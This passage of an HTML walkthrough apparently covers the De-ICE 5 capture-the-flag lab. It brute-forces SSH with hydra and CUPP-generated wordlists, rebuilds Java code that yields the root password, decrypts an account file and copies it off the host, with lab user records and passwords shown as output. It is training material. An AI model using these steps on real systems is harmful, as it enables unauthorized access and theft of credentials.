+</span><span class="hll"><span class="c1"># [22][ssh] host: de-ice5.com   login: sdadmin   password: donovin1998</span>
+</span></pre></div>
+</div>
+<p>A little reconnaissance using sdadmin gives two similar mail files:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll">sshpass -p <span class="s1">&#39;donovin1998&#39;</span> ssh sdadmin@de-ice5.com
+</span><span class="hll">ls -l <span class="nv">$HOME</span>/mailserv_download/
+</span><span class="c1"># returns</span>
+<span class="hll"><span class="c1"># -rw-r--r-- 1 sdadmin users  1267 Dec 29  2010 2010122015043.j15Htu1H341102</span>
+</span><span class="hll"><span class="c1"># -rw-r--r-- 1 sdadmin users 14178 Dec 30  2010 2010122216451.f81Ltw4R010211.part3</span>
+</span><span class="c1"># see the java code</span>
+strings <span class="nv">$HOME</span>/mailserv_download/2010122216451.f81Ltw4R010211.part3
+<span class="c1"># see the email</span>
+file <span class="nv">$HOME</span>/mailserv_download/2010122015043.j15Htu1H341102
+<span class="c1"># returns</span>
+<span class="c1"># /home/csadmin/mailserv_download/2010122014234.j12Gqo4H049241: ASCII mail text</span>
+cat <span class="nv">$HOME</span>/mailserv_download/2010122015043.j15Htu1H341102
+<span class="nb">exit</span>
+</pre></div>
+</div>
+<p>Running <code class="docutils literal"><span class="pre">strings</span> <span class="pre">2010122216451.f81Ltw4R010211.part3</span></code> shows it has embedded Java code, but it’s only “part3”. Displaying <code class="file docutils literal"><span class="pre">2010122015043.j15Htu1H341102</span></code> shows it’s mail text:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">To: sdadmin@nosecbank.com</span>
+<span class="go">CC:</span>
+<span class="go">Subject: RE: My Son&#39;s Birthday</span>
+<span class="go">Date: Mon, 20 Dec 2010 15:04:32 +0500</span>
+<span class="go">Return-Path: &lt;csadmin@nosecbank.com&gt;</span>
+<span class="go">Delived-To: sdadmin:nosecbank.com@nosecbank.com</span>
+<span class="go">Received: (qmail 20281 invoked from network); 20 Dec 2010 10:04:32 -0000</span>
+<span class="go">X-Received: from network (192.168.1.123) by mailserv3-4.us6.service.com;</span>
+<span class="go">20 Dec 2010 10:04:32 -0000</span>
+<span class="go">Received: from www.nosecbank.com (unknown [198.65.139.32]) by</span>
+<span class="go">srv3.us6.service.com (Postfix) with ESMTP id D98214787FD for</span>
+<span class="go">&lt;csadmin@nosecbank.com; Mon, 20 Dec 2010 10:04:32 +0000 (GMT)</span>
+<span class="go">Message-Id: &lt;2010122015043.j15Htu1H341102@www.nosecbank.com&gt;</span>
+<span class="go">Mime-Version: 1.0</span>
+<span class="go">Content-Type: multipart/alternative;</span>
+<span class="go">boundary=&quot;---=_NextPart_000_0000_05F11S20.FGHZWE49&quot;</span>
+<span class="go">X-Mailer: K-Mail; Build 1.0.5510</span>
+<span class="go">Thread-Index: Aa5fqAwT8nsBe3T3T5q67a3Fd22XsZ==</span>
+<span class="go">Message: Hey there Paul!  I would gladly bring myself and my son over</span>
+<span class="go">tomorrow after work!  I would only be hesitant to come over if you</span>
+<span class="hll"><span class="go">invited Fred over too... He just freaks me out sometimes.  It doesnt</span>
+</span><span class="go">help that he locks himself up in his office and is anti-social during</span>
+<span class="hll"><span class="go">lunch hours... On top of that he calls himself the &quot;databaser&quot;!  I mean,</span>
+</span><span class="go">who in thier right mind does that?  Either way, I will most likely be</span>
+<span class="go">there tomorrow.  I look forward to it!   -Mark</span>
+</pre></div>
+</div>
+<p>We’re guessing Fred (the “databaser”) is the missing dbadmin user. Rather than hurling <strong class="program">hydra</strong> at it with a standard password list, let’s see if we can repeat using the email information in CUPP to generate another password list.</p>
+</div>
+<div class="section" id="try-user-dbadmin">
+<h3>3.4.3.4. Try user dbadmin<a class="headerlink" href="#try-user-dbadmin" title="Permalink to this headline">¶</a></h3>
+<p>So we’ll try <a class="reference external" href="https://github.com/Mebus/cupp">Mebus/cupp</a> to generate password guesses:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice5
+<span class="nb">source</span> <span class="nv">$PT</span>/de-ice5_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+
+<span class="c1"># CUPP already downloaded above.</span>
+<span class="c1"># curl --silent --insecure --remote-name \</span>
+<span class="c1">#   https://raw.githubusercontent.com/Mebus/cupp/master/cupp.py</span>
+<span class="c1"># curl --silent --insecure --remote-name \</span>
+<span class="c1">#   https://raw.githubusercontent.com/Mebus/cupp/master/cupp.cfg</span>
+
+<span class="hll"><span class="c1"># Generate passwords for dbadmin using CUPP</span>
+</span>python cupp.py -h
+<span class="hll">python cupp.py -i
+</span><span class="hll"><span class="c1"># non-default values entered</span>
+</span><span class="hll"><span class="c1"># &gt; First Name: Fred</span>
+</span><span class="hll"><span class="c1"># &gt; Nickname: databaser</span>
+</span><span class="hll"><span class="c1"># &gt; Do you want to add special chars at the end of words? Y/[N]: y</span>
+</span><span class="hll"><span class="c1"># &gt; Do you want to add some random numbers at the end of words? Y/[N]: y</span>
+</span><span class="hll"><span class="c1"># Try and crack dbadmin</span>
+</span><span class="hll">hydra -F -l dbadmin -P fred.txt -t <span class="m">2</span> de-ice5.com ssh
+</span><span class="hll"><span class="c1"># results in</span>
+</span><span class="hll"><span class="c1"># [22][ssh] host: de-ice5.com   login: dbadmin   password: databaser60</span>
+</span></pre></div>
+</div>
+<p>A little reconnaissance using dbadmin reveals the part1 mail file:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice5
+<span class="nb">source</span> <span class="nv">$PT</span>/de-ice5_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+
+<span class="hll">sshpass -p <span class="s1">&#39;donovin1998&#39;</span> ssh sdadmin@de-ice5.com
+</span><span class="hll">ls -l <span class="nv">$HOME</span>/mailserv_download/
+</span><span class="hll"><span class="c1"># returns</span>
+</span><span class="hll"><span class="c1"># -rw-r--r-- 1 dbadmin users 13985 Dec 30  2010 2010122216451.f81Ltw4R010211.part1</span>
+</span><span class="nb">exit</span>
+</pre></div>
+</div>
+<p>Running <code class="docutils literal"><span class="pre">strings</span> <span class="pre">2010122216451.f81Ltw4R010211.part1</span></code> shows it has embedded Java code, but it’s only “part1”.</p>
+</div>
+<div class="section" id="running-the-java-code-to-get-root-sysadmin-passwords">
+<h3>3.4.3.5. Running the java code to get root, sysadmin passwords<a class="headerlink" href="#running-the-java-code-to-get-root-sysadmin-passwords" title="Permalink to this headline">¶</a></h3>
+<p>So let’s collect the java code on Kali:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice5
+<span class="nb">source</span> <span class="nv">$PT</span>/de-ice5_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+
+<span class="hll"><span class="o">{</span> sshpass -p <span class="s1">&#39;databaser60&#39;</span> ssh dbadmin@de-ice5.com <span class="se">\</span>
+</span><span class="hll">    <span class="s1">&#39;cat /home/dbadmin/mailserv_download/2010122216451.f81Ltw4R010211.part1&#39;</span><span class="p">;</span>
+</span><span class="hll">  sshpass -p <span class="s1">&#39;rocker&#39;</span> ssh csadmin@de-ice5.com <span class="se">\</span>
+</span><span class="hll">    <span class="s1">&#39;cat /home/csadmin/mailserv_download/2010122216451.f81Ltw4R010211.part2&#39;</span><span class="p">;</span>
+</span><span class="hll">  sshpass -p <span class="s1">&#39;donovin1998&#39;</span> ssh sdadmin@de-ice5.com <span class="se">\</span>
+</span><span class="hll">    <span class="s1">&#39;cat /home/sdadmin/mailserv_download/2010122216451.f81Ltw4R010211.part3&#39;</span><span class="p">;</span>
+</span><span class="hll"><span class="o">}</span> <span class="p">|</span> strings -n <span class="m">10</span> <span class="p">|</span> grep -v <span class="s1">&#39;MESSAGE CORRUPTED&#39;</span> &gt; Exploit.java
+</span></pre></div>
+</div>
+<p>First clean up the code, moving lines 46-49 to the end. Next, run in through a Java cleanup site. Then add a main routine at the top.</p>
+<div class="highlight-java"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Exploit</span> <span class="o">{</span>
+
+<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+
+  <span class="n">Exploit</span> <span class="n">e</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Exploit</span><span class="o">();</span>
+  <span class="kt">int</span> <span class="n">c</span><span class="o">[]</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="na">processLoop</span><span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
+  <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">+</span> <span class="s">&quot;=&quot;</span><span class="o">);</span>
+  <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">c</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span>
+    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">((</span><span class="kt">char</span><span class="o">)</span><span class="n">c</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
+  <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="s">&quot;&quot;</span><span class="o">);</span>
+<span class="o">}</span>
+
+<span class="c1">// ... rest of code</span>
+
+<span class="o">}</span>
+</pre></div>
+</div>
+<p>Next make these corrections:</p>
+<ul class="simple">
+<li><code class="docutils literal"><span class="pre">int[]</span> <span class="pre">encArr</span> <span class="pre">=</span> <span class="pre">int[strL</span> <span class="pre">+</span> <span class="pre">2];</span></code> to <code class="docutils literal"><span class="pre">int[]</span> <span class="pre">encArr</span> <span class="pre">=</span> <span class="pre">new</span> <span class="pre">int[strL</span> <span class="pre">+</span> <span class="pre">2];</span></code></li>
+<li><code class="docutils literal"><span class="pre">int[]</span> <span class="pre">encNew</span> <span class="pre">=</span> <span class="pre">int[input.length</span> <span class="pre">+</span> <span class="pre">ref];</span></code> to <code class="docutils literal"><span class="pre">int[]</span> <span class="pre">encNew</span> <span class="pre">=</span> <span class="pre">new</span> <span class="pre">int[input.length</span> <span class="pre">+</span> <span class="pre">ref];</span></code></li>
+<li><code class="docutils literal"><span class="pre">int</span> <span class="pre">strL</span> <span class="pre">=</span> <span class="pre">input.length;</span></code> to <code class="docutils literal"><span class="pre">int</span> <span class="pre">strL</span> <span class="pre">=</span> <span class="pre">input.length();</span></code></li>
+<li><code class="docutils literal"><span class="pre">encArr</span> <span class="pre">=</span> <span class="pre">loopProcesS(encArr);</span></code> to <code class="docutils literal"><span class="pre">encArr</span> <span class="pre">=</span> <span class="pre">loopProcess(encArr);</span></code></li>
+<li><code class="docutils literal"><span class="pre">if</span> <span class="pre">(i</span> <span class="pre">%</span> <span class="pre">2</span> <span class="pre">==</span> <span class="pre">0)</span> <span class="pre">input[i]</span> <span class="pre">=</span> <span class="pre">(input[i]</span> <span class="pre">%</span> <span class="pre">check)</span> <span class="pre">+</span> <span class="pre">(ref</span> <span class="pre">+</span> <span class="pre">i);</span></code> to <code class="docutils literal"><span class="pre">if</span> <span class="pre">(i</span> <span class="pre">%</span> <span class="pre">2</span> <span class="pre">==</span> <span class="pre">0)</span> <span class="pre">input[i]</span> <span class="pre">=</span> <span class="pre">(input[i]</span> <span class="pre">%</span> <span class="pre">ch)</span> <span class="pre">+</span> <span class="pre">(ref</span> <span class="pre">+</span> <span class="pre">i);</span></code></li>
+<li><code class="docutils literal"><span class="pre">for</span> <span class="pre">(int</span> <span class="pre">i</span> <span class="pre">=</span> <span class="pre">0;</span> <span class="pre">i</span> <span class="pre">&lt;</span> <span class="pre">encArr;</span> <span class="pre">i++)</span> <span class="pre">{</span></code> to <code class="docutils literal"><span class="pre">for</span> <span class="pre">(int</span> <span class="pre">i</span> <span class="pre">=</span> <span class="pre">0;</span> <span class="pre">i</span> <span class="pre">&lt;</span> <span class="pre">encArr.length;</span> <span class="pre">i++)</span> <span class="pre">{</span></code></li>
+<li><code class="docutils literal"><span class="pre">for</span> <span class="pre">(int</span> <span class="pre">i</span> <span class="pre">=</span> <span class="pre">0;</span> <span class="pre">i</span> <span class="pre">&lt;</span> <span class="pre">strL</span> <span class="pre">+</span> <span class="pre">1;</span> <span class="pre">i++)</span> <span class="pre">{</span></code> to <code class="docutils literal"><span class="pre">for</span> <span class="pre">(int</span> <span class="pre">i</span> <span class="pre">=</span> <span class="pre">1;</span> <span class="pre">i</span> <span class="pre">&lt;</span> <span class="pre">strL</span> <span class="pre">+</span> <span class="pre">1;</span> <span class="pre">i++)</span> <span class="pre">{</span></code></li>
+</ul>
+<p>At this point the code should look something like:</p>
+<div class="highlight-java"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Exploit</span> <span class="o">{</span>
+
+<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+
+  <span class="n">Exploit</span> <span class="n">e</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Exploit</span><span class="o">();</span>
+  <span class="kt">int</span> <span class="n">c</span><span class="o">[]</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="na">processLoop</span><span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
+  <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">+</span> <span class="s">&quot;=&quot;</span><span class="o">);</span>
+  <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">c</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span>
+    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">((</span><span class="kt">char</span><span class="o">)</span><span class="n">c</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
+  <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="s">&quot;\n&quot;</span><span class="o">);</span>
+<span class="o">}</span>
+
+
+<span class="cm">/*input is username of account*/</span>
+<span class="kt">int</span><span class="o">[]</span> <span class="nf">processLoop</span><span class="o">(</span><span class="n">String</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kt">int</span> <span class="n">strL</span> <span class="o">=</span> <span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">();</span>
+        <span class="kt">int</span> <span class="n">lChar</span> <span class="o">=</span> <span class="o">(</span><span class="kt">int</span><span class="o">)</span> <span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">strL</span> <span class="o">-</span> <span class="mi">1</span><span class="o">);</span>
+        <span class="kt">int</span> <span class="n">fChar</span> <span class="o">=</span> <span class="o">(</span><span class="kt">int</span><span class="o">)</span> <span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
+        <span class="kt">int</span><span class="o">[]</span> <span class="n">encArr</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[</span><span class="n">strL</span> <span class="o">+</span> <span class="mi">2</span><span class="o">];</span>
+        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">strL</span> <span class="o">+</span> <span class="mi">1</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+                <span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="kt">int</span><span class="o">)</span> <span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="n">encArr</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="kt">int</span><span class="o">)</span> <span class="n">lChar</span><span class="o">;</span>
+        <span class="n">encArr</span><span class="o">[</span><span class="n">encArr</span><span class="o">.</span><span class="na">length</span> <span class="o">-</span> <span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="kt">int</span><span class="o">)</span> <span class="n">fChar</span><span class="o">;</span>
+        <span class="n">encArr</span> <span class="o">=</span> <span class="n">backLoop</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
+        <span class="n">encArr</span> <span class="o">=</span> <span class="n">loopBack</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
+        <span class="n">encArr</span> <span class="o">=</span> <span class="n">loopProcess</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
+        <span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="n">encArr</span><span class="o">.</span><span class="na">length</span> <span class="o">-</span> <span class="mi">1</span><span class="o">;</span>
+        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">encArr</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">i</span> <span class="o">==</span> <span class="n">j</span><span class="o">)</span> <span class="k">break</span><span class="o">;</span>
+                <span class="kt">int</span> <span class="n">t</span> <span class="o">=</span> <span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
+                <span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">encArr</span><span class="o">[</span><span class="n">j</span><span class="o">];</span>
+                <span class="n">encArr</span><span class="o">[</span><span class="n">j</span><span class="o">]</span> <span class="o">=</span> <span class="n">t</span><span class="o">;</span>
+                <span class="n">j</span><span class="o">--;</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">encArr</span><span class="o">;</span>
+<span class="o">}</span>
+<span class="cm">/*Note the pseudocode will be implemented with the</span>
+<span class="cm">root account and my account, we still need to implement it with the csadmin, sdadmin,</span>
+<span class="cm">and dbadmin accounts though*/</span>
+<span class="kt">int</span><span class="o">[]</span> <span class="nf">backLoop</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kt">int</span> <span class="n">ref</span> <span class="o">=</span> <span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
+        <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="n">input</span><span class="o">[</span><span class="mi">1</span><span class="o">];</span>
+        <span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="n">input</span><span class="o">[</span><span class="n">ref</span> <span class="o">-</span> <span class="mi">1</span><span class="o">];</span>
+        <span class="kt">int</span> <span class="n">ch</span> <span class="o">=</span> <span class="o">(</span><span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="o">)</span> <span class="o">/</span> <span class="mi">2</span><span class="o">;</span>
+        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">ref</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">i</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">%</span> <span class="n">ch</span><span class="o">)</span> <span class="o">+</span> <span class="o">(</span><span class="n">ref</span> <span class="o">+</span> <span class="n">i</span><span class="o">);</span>
+                <span class="k">else</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">+</span> <span class="n">ref</span> <span class="o">+</span> <span class="n">i</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">input</span><span class="o">;</span>
+<span class="o">}</span>
+<span class="kt">int</span><span class="o">[]</span> <span class="nf">loopBack</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kt">int</span> <span class="n">ref</span> <span class="o">=</span> <span class="n">input</span><span class="o">.</span><span class="na">length</span> <span class="o">/</span> <span class="mi">2</span><span class="o">;</span>
+        <span class="kt">int</span><span class="o">[]</span> <span class="n">encNew</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[</span><span class="n">input</span><span class="o">.</span><span class="na">length</span> <span class="o">+</span> <span class="n">ref</span><span class="o">];</span>
+        <span class="kt">int</span> <span class="n">ch</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
+        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="o">(</span><span class="n">ref</span> <span class="o">/</span> <span class="mi">2</span><span class="o">);</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+                <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">input</span><span class="o">[</span><span class="n">ch</span><span class="o">];</span>
+                <span class="n">ch</span><span class="o">++;</span>
+        <span class="o">}</span>
+        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">encNew</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">&lt;=</span> <span class="mi">33</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="mi">33</span> <span class="o">+</span> <span class="o">(++</span><span class="n">ref</span> <span class="o">*</span> <span class="mi">2</span><span class="o">);</span>
+                <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">&gt;=</span> <span class="mi">126</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="mi">126</span> <span class="o">-</span> <span class="o">(--</span><span class="n">ref</span> <span class="o">*</span> <span class="mi">2</span><span class="o">);</span>
+                <span class="k">else</span> <span class="o">{</span>
+                        <span class="k">if</span> <span class="o">(</span><span class="n">i</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">-=</span> <span class="o">(</span><span class="n">i</span> <span class="o">%</span> <span class="mi">3</span><span class="o">);</span>
+                        <span class="k">else</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">+=</span> <span class="o">(</span><span class="n">i</span> <span class="o">%</span> <span class="mi">2</span><span class="o">);</span>
+                <span class="o">}</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">encNew</span><span class="o">;</span>
+<span class="o">}</span>
+<span class="kt">int</span><span class="o">[]</span> <span class="nf">loopProcess</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">==</span> <span class="mi">40</span> <span class="o">||</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">==</span> <span class="mi">41</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">+=</span> <span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
+                <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">==</span> <span class="mi">45</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">+=</span> <span class="mi">20</span> <span class="o">+</span> <span class="n">i</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">input</span><span class="o">;</span>
+<span class="o">}</span>
+
+<span class="o">}</span>
+</pre></div>
+</div>
+<p>Running it should give us our passwords:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">javac Exploit.java</span>
+</span><span class="hll"><span class="go">java Exploit root</span>
+</span><span class="gp">#</span> returns
+<span class="hll"><span class="gp">#</span> <span class="nv">root</span> <span class="o">=</span>
+</span><span class="hll"><span class="gp">#</span> <span class="m">31</span>/Fwxw+2
+</span><span class="hll"><span class="go">java Exploit sysadmin</span>
+</span><span class="gp">#</span> returns
+<span class="hll"><span class="gp">#</span> <span class="nv">sysadmin</span> <span class="o">=</span>
+</span><span class="hll"><span class="gp">#</span> <span class="m">7531</span>/<span class="o">{{</span>tor/rv/A
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="capturing-the-flag-as-root">
+<h3>3.4.3.6. Capturing the flag as root<a class="headerlink" href="#capturing-the-flag-as-root" title="Permalink to this headline">¶</a></h3>
+<p>Since root can’t log in directly, login first with csadmin then switch to root to attack the already-found <code class="file docutils literal"><span class="pre">/home/ftp/incoming/useracc_update.csv.enc</span></code>:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice5
+<span class="nb">source</span> <span class="nv">$PT</span>/de-ice5_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+
+<span class="hll">sshpass -p <span class="s1">&#39;rocker&#39;</span> ssh csadmin@de-ice5.com
+</span><span class="hll">su - root <span class="c1"># 31/Fwxw+2</span>
+</span><span class="hll">id
+</span><span class="hll"><span class="c1"># returns</span>
+</span><span class="hll"><span class="c1"># uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)</span>
+</span><span class="hll"><span class="nb">cd</span> /home/ftp/incoming
+</span><span class="hll"><span class="c1"># Try using root password to decrypt user account data</span>
+</span><span class="hll">openssl enc -d -aes-256-cbc -salt -in useracc_update.csv.enc -out flag.csv -pass pass:<span class="s1">&#39;31/Fwxw+2&#39;</span>
+</span><span class="hll">cat flag.csv
+</span></pre></div>
+</div>
+<p>To smuggle the data out to Kali is as simple as:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice5
+<span class="nb">source</span> <span class="nv">$PT</span>/de-ice5_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+
+<span class="hll">sshpass -p <span class="s1">&#39;rocker&#39;</span> ssh csadmin@de-ice5.com <span class="s1">&#39;cat /home/ftp/incoming/flag.csv&#39;</span> &gt; flag.csv
+</span></pre></div>
+</div>
+<p>Running <code class="docutils literal"><span class="pre">cat</span> <span class="pre">flag.csv</span></code> gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">ID,Last,First,Email,State,Username,Password,Verifacation Code,Pin code</span>
+<span class="go">1000,Carr,Alfred,acarr23@gmail.com,NY,acarr9096,phantom4,952733,490</span>
+<span class="go">1001,Karson,William,wkarson53@yahoo.com,NY,wkarson2431,rockallday123,567094,345</span>
+<span class="go">1002,Wheeler,Cordy,megawheels98@rocketmail.com,NY,cwheeler5031,goeagles90,462724,631</span>
+<span class="go">1003,Smith,Ken,synthesizer_1r@gmail.com,NY,ksmith6253,crystalization,636721,353</span>
+<span class="go">1004,Quinn,Cynthia,qcq92@aol.com,NY,cquinn1217,archyandhenry,680247,223</span>
+<span class="go">1005,Floyd,Wilson,jukeboxer_4life@gmail.com,NY,wfloyd5931,knockout66,521456,441</span>
